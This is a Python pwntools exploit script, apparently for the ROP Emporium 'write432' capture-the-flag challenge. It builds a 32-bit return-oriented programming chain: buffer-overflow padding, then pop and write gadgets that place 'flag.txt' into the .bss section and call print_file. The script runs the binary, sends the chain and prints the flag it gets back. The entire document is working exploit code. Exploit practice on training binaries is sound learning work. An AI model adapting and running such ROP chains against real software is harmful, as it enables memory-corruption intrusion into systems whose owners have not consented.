from pwn import *

BINARY = './write432'
context.os  = 'linux'
context.arch = 'i386'
context.binary = ELF(BINARY)


PAYLOAD  = 1

print_file = 0x080483d0
bss_addr = 0x0804a020
pop2ret = 0x080485aa # (pop edi ; pop ebp ; ret)
usefulGadget = 0x08048543


def output2file(data):
    with open('./input', 'wb') as f:
        f.write(data)

def payload_1():
    rop = b"A"*44
    rop += p32(pop2ret)
    rop += p32(bss_addr)
    rop += b"flag"
    rop += p32(usefulGadget)
    rop += p32(pop2ret)
    rop += p32(bss_addr+4)
    rop += b".txt"
    rop += p32(usefulGadget)
    rop += p32(print_file)
    rop += b"BBBB"
    rop += p32(bss_addr)

    return rop 

p = process(BINARY)
rop = payload_1()
log.success(f"ROP chain : {rop}")
p.sendline(rop)
flag = p.recvall()
print(flag)
output2file(rop)
